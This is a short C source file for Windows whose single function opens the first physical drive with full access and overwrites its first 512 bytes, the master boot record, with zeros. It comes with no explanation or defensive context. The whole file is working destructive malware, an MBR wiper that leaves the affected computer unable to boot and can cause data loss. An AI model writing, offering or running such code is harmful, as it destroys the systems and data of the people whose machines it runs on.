#include <Windows.h> 

int MBR() {
    DWORD write;
    char mbr[512];
    ZeroMemory(&mbr, (sizeof mbr));

    HANDLE MBR = CreateFile(L"\\\\.\\PhysicalDrive0",
        GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    WriteFile(MBR, mbr, 512, &write, NULL);
    CloseHandle(MBR);
    return 0;
}
